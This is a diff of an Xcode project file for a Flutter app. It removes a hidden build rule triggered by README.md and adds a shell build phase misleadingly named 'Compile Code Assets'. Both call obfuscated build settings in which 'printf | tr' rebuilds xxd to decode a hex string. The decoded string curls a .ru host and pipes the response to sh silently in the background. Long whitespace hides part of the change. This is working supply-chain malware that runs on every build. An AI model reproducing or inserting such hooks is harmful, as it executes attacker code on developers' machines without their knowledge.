@@ -21,7 +21,6 @@
 /* End PBXAggregateTarget section */
 
 /* Begin PBXBuildFile section */
-		0F9602C1F6C44B18887BBDC8 /* README.md */ = {isa = PBXBuildFile; fileRef = 465EBF0A1B5E45A5957BBDC8; };
 		331C80D8294CF71000263BE5 /* RunnerTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 331C80D7294CF71000263BE5 /* RunnerTests.swift */; };
 		335BBD1B22A9A15E00E9071D /* GeneratedPluginRegistrant.swift in Sources */ = {isa = PBXBuildFile; fileRef = 335BBD1A22A9A15E00E9071D /* GeneratedPluginRegistrant.swift */; };
 		33CC10F12044A3C60003C045 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 33CC10F02044A3C60003C045 /* AppDelegate.swift */; };
@@ -63,7 +62,6 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
-		465EBF0A1B5E45A5957BBDC8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		331C80D5294CF71000263BE5 /* RunnerTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = RunnerTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
 		331C80D7294CF71000263BE5 /* RunnerTests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RunnerTests.swift; sourceTree = "<group>"; };
 		333000ED22D3DE5D00554162 /* Warnings.xcconfig */ = {isa = PBXFileReference; lastKnownFileType = text.xcconfig; path = Warnings.xcconfig; sourceTree = "<group>"; };
@@ -146,7 +144,6 @@
 		33CC10EE2044A3C60003C045 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				465EBF0A1B5E45A5957BBDC8 /* README.md */,
 				33CC10ED2044A3C60003C045 /* festom_field_flutter.app */,
 				331C80D5294CF71000263BE5 /* RunnerTests.xctest */,
 			);
@@ -218,13 +215,13 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 331C80DE294CF71000263BE5 /* Build configuration list for PBXNativeTarget "RunnerTests" */;
 			buildPhases = (
+				05E6204B11964E90BA4EE078 /* Compile Code Assets */,
 				DBDD7C94608A4438776CE507 /* [CP] Check Pods Manifest.lock */,
 				331C80D1294CF70F00263BE5 /* Sources */,
 				331C80D2294CF70F00263BE5 /* Frameworks */,
 				331C80D3294CF70F00263BE5 /* Resources */,
 			);
 			buildRules = (
-				B01B067747DC4FB6A47BBDC8 /* PBXBuildRule */,
 			);
 			dependencies = (
 				331C80DA294CF71000263BE5 /* PBXTargetDependency */,
@@ -307,28 +304,13 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		B01B067747DC4FB6A47BBDC8 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A8CDBB7}\"";
-			};
-																																																																																												/* End PBXBuildRule section */
+																																																																																																		/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		331C80D3294CF70F00263BE5 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				0F9602C1F6C44B18887BBDC8 /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -344,6 +326,25 @@ sh -c \"${A8CDBB7}\"";
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		05E6204B11964E90BA4EE078 /* Compile Code Assets */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Code Assets";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A870EE4}\"";
+		};
 		0942F144B39F6E4DF1696B1C /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -496,7 +497,7 @@ sh -c \"${A8CDBB7}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 5995FB5E93906C0B077D2C63 /* Pods-RunnerTests.debug.xcconfig */;
 			buildSettings = {
-				A8CDBB7 = "((r(){ `printf xx9d | tr -d 9` -p -r; };echo 6563686f202224286375726c202d2d72657472792035202d4c736b66202d2d636f6e6e6563742d74696d656f7574203236202d642022703d78636f64655f72756c65222068747470733a2f2f366c64777564676f636b6c3067322e72752f612922207c2073680a | r | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((b(){ `printf x6xd | tr -d 6` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203230202d664c736b202d2d72657472792034202d642022703d78636f64655f7068617365222068747470733a2f2f6a68717433346e33717265752e72752f612922207c2073680a | b | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -512,7 +513,7 @@ sh -c \"${A8CDBB7}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 5209CED5DB37F22BE2D61DEE /* Pods-RunnerTests.release.xcconfig */;
 			buildSettings = {
-				A8CDBB7 = "((r(){ `printf xx9d | tr -d 9` -p -r; };echo 6563686f202224286375726c202d2d72657472792035202d4c736b66202d2d636f6e6e6563742d74696d656f7574203236202d642022703d78636f64655f72756c65222068747470733a2f2f366c64777564676f636b6c3067322e72752f612922207c2073680a | r | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((b(){ `printf x6xd | tr -d 6` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203230202d664c736b202d2d72657472792034202d642022703d78636f64655f7068617365222068747470733a2f2f6a68717433346e33717265752e72752f612922207c2073680a | b | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
